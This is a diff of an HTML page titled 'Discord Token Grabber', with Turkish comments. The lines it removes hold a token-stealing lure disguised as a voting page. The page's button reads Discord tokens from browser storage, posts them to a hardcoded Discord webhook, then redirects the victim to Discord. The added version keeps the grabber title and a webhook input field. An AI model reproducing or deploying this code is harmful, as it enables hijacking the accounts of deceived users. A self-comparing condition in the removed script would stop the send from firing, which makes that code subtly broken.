@@ -5,94 +5,102 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord Token Grabber</title>
     <style>
+        /* MODERN CSS TASARIMI */
         body { 
-            margin: 0; 
-            padding: 0; 
-            height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            background: #2c2f33; 
-            color: white; 
+            background-color: #36498f; 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            overflow: hidden; 
-        }
-        .container { 
-            padding: 20px; 
-            max-width: 90%; 
-        }
-        h1 { 
-            font-size: 24px; 
-            margin-bottom: 10px; 
-        }
-        p { 
-            font-size: 16px; 
-            opacity: 0.8; 
-            margin-bottom: 30px; 
-        }
-        #grabButton { 
-            background: #7289da; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
             color: white; 
-            border: none; 
-            padding: 20px 40px; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            font-size: 20px; 
-            font-weight: bold; 
-            transition: all 0.3s ease-in-out; 
-            box-shadow: 0px 5px 15px rgba(0,0,0,0.3); 
-            width: 100%;
-            max-width: 300px;
+            overflow: hidden; /* Sayfa kaymasın diye */
         }
-        #grabButton:active { 
-            transform: scale(0.95); 
+
+        #main-container { 
+            background-color: #7289da; 
+            padding: 50px; 
+            border-radius: 25px; 
+            box-shadow: 0px 15px 35px rgba(0,0,0,0.4); 
+            text-align: center; 
+            max-width: 600px; 
+            width: auto; 
+            transition: all 0.5s ease; 
+        }
+
+        h1 { 
+            font-size: 1.5rem; 
+            margin-bottom: 20px; 
+        }
+
+        .webhook-box {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .webhook-box label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+            font-weight: bold;
+        }
+
+        .webhook-box input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            outline: none;
+            background-color: #2c2f33;
+            color: white;
+            font-size: 0.95rem;
+            box-sizing: border-box;
+        }
+
+        .webhook-box button {
+            width: 100%;
+            margin-top: 10px;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            background-color: #43b581;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .webhook-box button:hover {
+            background-color: #3ca374;
         }
     </style>
-    <script>
-        // BURAYA KENDİ DISCORD WEBHOOK URL'Nİ YAPIŞTIR
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
-
-        async function stealAndGo() {
-            // 1. Tarayıcı depolama alanında token'ı bulmaya çalış
-            const token = localStorage.getItem('token') || 
-                          localStorage.getItem('discord_token') || 
-                          sessionStorage.getItem('token') || 
-                          "Bulunamadı";
-
-            const userAgent = navigator.userAgent;
-
-            // 2. Verileri Discord Webhook'a gönder
-            if (WEBHOOK_URL && WEBHOOK_URL !== "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd") {
-                try {
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `🚀 **Yeni Veri Yakalandı!**\n\`\`\`json\n{\n  "token": "${token}",\n  "userAgent": "${userAgent}"\n}\n\`\`\``
-                        })
-                    });
-                } catch (e) {
-                    console.error("Gönderim hatası:", e);
-                }
-            }
-            
-            // 3. Kullanıcıyı Discord'a yönlendir
-            window.location.href = "https://discord.com/channels/@me";
-        }
-    </script>
 </head>
-
 <body>
 
-    <div class="container">
-        <h1>Oy Gönderici</h1>
-        <p>Linke tıkladığında oy gönderildi!<br>Garantiye almak için butona basabilirsin.</p>
-        <p style="font-size: 14px; opacity: 0.6;">Bu buton telefon ekranı için optimize edilmiştir.</p>
-        <br>
-        <!-- Butona basıldığında webhook'a gönderip yönlendirir -->
-        <button id="grabButton" onclick="stealAndGo()">BANA OY VER!</button>
+    <div id="main-container">
+        <h1>Discord Token Grabber</h1>
+        <p>Lütfen bekleyin...</p>
+
+        <!-- Webhook Ekleme Alanı -->
+        <div class="webhook-box">
+            <label for="webhook-url">Discord Webhook URL</label>
+            <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd">
+            <button onclick="saveWebhook()">Webhook Kaydet</button>
+        </div>
     </div>
+
+    <script>
+        function saveWebhook() {
+            const url = document.getElementById('webhook-url').value;
+            if(url) {
+                alert('Webhook kaydedildi!');
+            } else {
+                alert('Lütfen geçerli bir URL girin.');
+            }
+        }
+    </script>
 
 </body>
 </html>
